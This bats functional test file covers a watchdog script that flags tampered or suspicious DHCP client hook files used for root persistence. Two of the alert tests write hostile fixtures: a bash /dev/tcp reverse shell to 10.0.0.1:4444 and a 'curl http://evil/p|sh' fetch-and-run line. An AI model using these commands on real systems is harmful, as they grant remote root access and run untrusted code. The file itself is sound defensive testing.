#!/usr/bin/env bats
# L2 bats functional tests for the dhclient-hooks-watchdog scan script.
#
# dhclient-script SOURCES the hook files AS ROOT on every DHCP lease event
# (BOUND/RENEW/REBIND/…); lease RENEW self-fires on a timer, so a planted
# hook is root-exec-on-network-event persistence (T1546). A hook that is
# world-writable / non-root-owned, or contains a command-injection pattern,
# is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the hook
# dir + files in a tmp sandbox via SELFDEF_DHCLIENT_DIRS / _FILES.
#
# Run with: bats packaging/test/L2-dhclient-hooks-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/dhclient-hooks-watchdog/systemd/dhclient-hooks-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    HOOKD="${TMP}/exit-hooks.d"; mkdir -p "${HOOKD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DHCLIENT_PROFILE="${PROFILE:-report}" \
    SELFDEF_DHCLIENT_BASELINE="${BASELINE}" \
    SELFDEF_DHCLIENT_DIRS="${DIRS_V:-$HOOKD}" \
    SELFDEF_DHCLIENT_FILES="${TMP}/no-extra-file" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# update resolv.conf on lease\necho "dhclient bound"\n' > "${HOOKD}/zzz_benign"
}

# ============================================================
# ok tier
# ============================================================

@test "no dhclient hooks → ok / no_dhclient_hooks" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_dhclient_hooks"'
    cap | grep -q '"severity":"ok"'
}

@test "benign hook, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged hooks on second run → ok / dhclient_hooks_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dhclient_hooks_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "a hook containing an injection pattern → alert / dhclient_hooks_suspicious" {
    seed_benign
    run_wd                                   # benign baseline
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HOOKD}/zzz_benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dhclient_hooks_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable hook → alert" {
    seed_benign
    run_wd
    chmod 0666 "${HOOKD}/zzz_benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign hook change → warn / dhclient_hooks_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# updated benign hook\necho "dhclient renew"\n' > "${HOOKD}/zzz_benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"dhclient_hooks_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a benign root-owned hook is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# fail-loud + enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious hook" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${HOOKD}/zzz_benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
